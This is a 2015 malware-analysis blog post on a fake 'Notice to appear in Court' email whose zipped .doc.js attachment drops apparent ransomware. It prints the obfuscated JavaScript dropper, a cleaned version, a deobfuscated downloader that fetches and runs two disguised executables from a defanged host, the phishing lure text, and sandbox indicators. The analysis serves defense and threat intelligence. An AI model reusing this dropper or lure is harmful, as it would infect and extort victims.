@@ -1,0 +1,468 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Ransomware From Emails With JavaScript Attachments - thought|pipe</title>
+  <meta name="author" content="elauqsap">
+
+  
+  <meta name="description" content="Ransomware From Emails With JavaScript Attachments written in malspam, malware analysis, ransomware, threat intel Recently I have been seeing emails &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://elauqsap.github.io/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="thought|pipe" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-46649594-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+  <body>
+    <a href="/" class="home-icon">
+      <img src="/images/home.png"/>
+    </a>
+
+    <article role="article" class="full-single-article">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        <h1>Ransomware From Emails With JavaScript Attachments</h1>
+        <div class="meta">
+          written 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-08-05T19:12:35-05:00" pubdate data-updated="true"></time>
+          
+
+in
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/malspam/'>malspam</a>, <a class='category' href='/blog/categories/malware-analysis/'>malware analysis</a>, <a class='category' href='/blog/categories/ransomware/'>ransomware</a>, <a class='category' href='/blog/categories/threat-intel/'>threat intel</a>
+  
+</span>
+
+
+        </div>
+        <p>Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall 3.0 variant but I did not verify it.</p>
+
+<!--more-->
+
+
+<h4>Email Indicators</h4>
+
+<pre><code>Received: from uplander.websitewelcome.com (uplander.websitewelcome.com [192.185.179.118])
+Subject: Notice to appear in Court #00000536215
+From: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
+Reply-To: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
+Attachment: 00000536215.zip -&gt; 00000536215.doc.js
+</code></pre>
+
+<hr />
+
+<h4>Message Body</h4>
+
+<pre><code>Notice to Appear,
+
+This is to inform you to appear in the Court on the August 11 for your case hearing.
+Please, do not forget to bring all the documents related to the case.
+Note: The case may be heard by the judge in your absence if you do not come.
+
+The copy of Court Notice is attached to this email.
+
+Yours faithfully,
+Allan Barnett,
+Court Secretary.
+</code></pre>
+
+<h3>Deobfuscating the JavaScript</h3>
+
+<p>Below is the original decompressed file contents. It tries to hide itself as a better known file type (.doc) but any modern operating system would most likely recognize and interpret the JavaScript file. Luckily for us, it is rather easy to deobfuscate something like this. You can use a tool like JSDetox or use a JavaScript interpreter like node.js. The key thing we need to overcome is that JSDetox and node.js most likely won&rsquo;t have access to ActiveX so we have to remove the check otherwise it will not deobfuscate.</p>
+
+<figure class='code'><figcaption><span>00000536215.doc.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">jlavws</span><span class="o">=</span><span class="s1">&#39;fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p&quot;uWvSocaruiapota.wSshieplulm&quot;m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">jdmkdr</span><span class="o">=</span><span class="s1">&#39;mtgreilnxgxse(a&quot;p%cTiEoMfPf%h&quot;f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z&quot;rMbSnXiMmLw2o.gXcMhLfHxTyTfPd&quot;a)p;y z exhoz.zot&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">xxjg</span><span class="o">=</span><span class="s1">&#39;ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w&quot;lAyDqOyDjBx.nS&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">bpm</span><span class="o">=</span><span class="s1">&#39;ptrrseaawms&quot;l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">his</span><span class="o">=</span><span class="s1">&#39; oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y&quot;tGqEeTn&quot;w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">bey</span><span class="o">=</span><span class="s1">&#39;ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g&quot;ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">yjb</span><span class="o">=</span><span class="s1">&#39;iwmcaygqeusr/ufeixvjeh1m.ojzptgh&quot;p,f w&quot;c5z3f2w7k4r7u3a5r0e.terxaev&quot;q,r q1h)l;udelv(b&quot;rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn&quot;y,k d&quot;p2z1e1y9i5f4z8v6z9r.iepxaen&quot;v,q e1v)&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">buh</span><span class="o">=</span><span class="s1">&#39;l;q&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">a1</span><span class="o">=</span><span class="nx">jlavws</span><span class="o">+</span><span class="nx">jdmkdr</span><span class="o">+</span><span class="nx">xxjg</span><span class="o">+</span><span class="nx">bpm</span><span class="o">+</span><span class="nx">his</span><span class="o">+</span><span class="nx">bey</span><span class="o">+</span><span class="nx">yjb</span><span class="o">+</span><span class="nx">buh</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a2</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a3</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>      <span class="kd">var</span> <span class="nx">a4</span><span class="o">=</span><span class="mi">10</span><span class="p">;</span>      <span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Scripting.Dictionary&quot;</span><span class="p">);</span>   <span class="nx">y</span><span class="p">.</span><span class="nx">add</span> <span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">);</span>      <span class="k">if</span> <span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">Item</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;t&quot;</span><span class="p">){</span><span class="nx">a4</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nx">a4</span><span class="o">=</span><span class="mi">10</span><span class="p">};</span>      <span class="kd">var</span> <span class="nx">a5</span><span class="o">=</span><span class="nx">a1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>   <span class="k">while</span><span class="p">(</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">a5</span><span class="p">){</span>    <span class="nx">a2</span> <span class="o">+=</span><span class="nx">a1</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="nx">a</span> <span class="o">+=</span><span class="nx">a3</span><span class="o">+</span><span class="nx">a4</span><span class="p">;</span>   <span class="p">};</span>   <span class="kd">var</span> <span class="nx">rosa</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;e&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;v&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;l&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">];</span>   <span class="kd">var</span> <span class="nx">tosta</span><span class="o">=</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">2</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">6</span><span class="o">+</span><span class="nx">a4</span><span class="p">];</span>   <span class="kd">var</span> <span class="nx">a6</span><span class="o">=</span><span class="nx">tosta</span><span class="p">;</span>   <span class="k">this</span><span class="p">[</span><span class="nx">a6</span><span class="p">](</span><span class="nx">a2</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Expanding and cleaning up the glob of JavaScript above gives us <code>00000536215_clean.doc.js</code>. I added comments to point out the key points to be aware of when running this through JSDetox/node. The first comment is where the script checks for ActiveX which both tools will not have access to out of the box. Looking at the code we can see the default value <code>a4 = 10</code> breaks the while loop before it can build the deobfuscated string. If we simply hard code <code>a4 = 0</code> before the loop and comment/delete the while loop it will build the string as intended. In the end the two values we care most about are <code>a2</code> and <code>a6</code>. When the script gets to <code>this[a6](a2)</code> it is essentially performing an <code>eval()</code> operation on the debofuscated string stored in <code>a2</code>.</p>
+
+<figure class='code'><figcaption><span>00000536215_clean.doc.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">jlavws</span> <span class="o">=</span> <span class="s1">&#39;fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p&quot;uWvSocaruiapota.wSshieplulm&quot;m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">jdmkdr</span> <span class="o">=</span> <span class="s1">&#39;mtgreilnxgxse(a&quot;p%cTiEoMfPf%h&quot;f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z&quot;rMbSnXiMmLw2o.gXcMhLfHxTyTfPd&quot;a)p;y z exhoz.zot&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">xxjg</span> <span class="o">=</span> <span class="s1">&#39;ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w&quot;lAyDqOyDjBx.nS&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">bpm</span> <span class="o">=</span> <span class="s1">&#39;ptrrseaawms&quot;l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">his</span> <span class="o">=</span> <span class="s1">&#39; oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y&quot;tGqEeTn&quot;w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">bey</span> <span class="o">=</span> <span class="s1">&#39;ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g&quot;ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">yjb</span> <span class="o">=</span> <span class="s1">&#39;iwmcaygqeusr/ufeixvjeh1m.ojzptgh&quot;p,f w&quot;c5z3f2w7k4r7u3a5r0e.terxaev&quot;q,r q1h)l;udelv(b&quot;rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn&quot;y,k d&quot;p2z1e1y9i5f4z8v6z9r.iepxaen&quot;v,q e1v)&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">buh</span> <span class="o">=</span> <span class="s1">&#39;l;q&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a1</span> <span class="o">=</span> <span class="nx">jlavws</span> <span class="o">+</span> <span class="nx">jdmkdr</span> <span class="o">+</span> <span class="nx">xxjg</span> <span class="o">+</span> <span class="nx">bpm</span> <span class="o">+</span> <span class="nx">his</span> <span class="o">+</span> <span class="nx">bey</span> <span class="o">+</span> <span class="nx">yjb</span> <span class="o">+</span> <span class="nx">buh</span><span class="p">;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a3</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Hardcode to 0, originally set to 10</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* 1.</span>
+</span><span class='line'><span class="cm">  Checks for ActiveX otherwise it will not deobfuscate</span>
+</span><span class='line'><span class="cm">  We can comment this out in JSDetox and hard code a4 to 0</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Scripting.Dictionary&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">y</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">Item</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;t&quot;</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">a4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">a4</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* 2.</span>
+</span><span class='line'><span class="cm">  This function will deobfuscate and build the string to be evaluated below</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a5</span> <span class="o">=</span> <span class="nx">a1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="nx">a</span> <span class="o">&lt;</span> <span class="nx">a5</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">a2</span> <span class="o">+=</span> <span class="nx">a1</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">a</span> <span class="o">+=</span> <span class="nx">a3</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* 3.</span>
+</span><span class='line'><span class="cm">  Transforms to set a6 = &#39;eval&#39;</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">rosa</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">];</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">tosta</span> <span class="o">=</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">0</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">2</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">4</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">6</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">];</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">a6</span> <span class="o">=</span> <span class="nx">tosta</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* 4.</span>
+</span><span class='line'><span class="cm">  The eval() function and a2 is the deobfuscated string to run</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="c1">// this[a6](a2);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now that we have a readable version of the JavaScript it is pretty easy to tell what it is doing. Basically the script downloads the two files <code>five1.jpg</code> and <code>five2.jpg</code> which are actually MS-DOS executables. Then using a Windows Script Host Shell it attempts to run each of the downloaded payloads.</p>
+
+<figure class='code'><figcaption><span>deobfuscated.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">dl</span><span class="p">(</span><span class="nx">fr</span><span class="p">,</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">rn</span><span class="p">){</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">&quot;%TEMP%&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">+</span> <span class="nx">fn</span><span class="p">;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">xo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">xo</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(){</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">xo</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span><span class="p">){</span>
+</span><span class='line'>      <span class="kd">var</span> <span class="nx">xa</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">xo</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">saveToFile</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span><span class='line'>    <span class="p">};</span>
+</span><span class='line'>  <span class="p">};</span>
+</span><span class='line'>  <span class="k">try</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">xo</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">fr</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">xo</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">rn</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span><span class='line'>      <span class="nx">ws</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">};</span>
+</span><span class='line'>  <span class="p">}</span>  <span class="k">catch</span> <span class="p">(</span><span class="nx">er</span><span class="p">){</span>  <span class="p">};</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="nx">dl</span><span class="p">(</span><span class="s2">&quot;hxxp://31072015a[.]com/images/five1.jpg&quot;</span><span class="p">,</span> <span class="s2">&quot;532747350.exe&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>   <span class="c1">// Download payload 1</span>
+</span><span class='line'><span class="nx">dl</span><span class="p">(</span><span class="s2">&quot;hxxp://31072015a[.]com/images/five2.jpg&quot;</span><span class="p">,</span> <span class="s2">&quot;211954869.exe&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// Download payload 2</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here are some of the network indicators and behaviors I observed from sandboxing the payloads. If you have any questions or comments about the analysis feel free to reach out to me.</p>
+
+<h4>five1.jpg/532747350.exe Analysis</h4>
+
+<pre><code># Payload Download: Response
+* Connected to 31072015a[.]com (195.225.228.156) port 80 (#0)
+GET /images/five1.jpg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: 31072015a[.]com
+Accept: */*
+
+HTTP/1.1 200 OK
+Server: Apache/2.2.15 (CentOS)
+Last-Modified: Wed, 05 Aug 2015 21:35:01 GMT
+ETag: "c10000c-40e00-51c972cdc4b23"
+Accept-Ranges: bytes
+Content-Length: 265728
+Connection: close
+
+# Registry Activity
+Modifies registry to disable system restore
+Creates a file in the windows start menu folder
+Modifies autorun registry key values
+
+# Network Traffic
+GET hxxp://ip-addr[.]es:80/
+Server IP: 188.165.164.184
+
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?w=cg1odjtnay
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?n=t1dfbt93fg
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?h=qovvtc388iq4bm
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?t=4l425ka9qjn
+Server IP: 112.78.2.209
+
+POST hxxp://aeusasoftball[.]com:80/wp-content/themes/sports-team-theme/includes/adva...cg1odjtnay
+Server IP: 184.168.47.225
+
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?b=cg1odjtnay
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?f=t1dfbt93fg
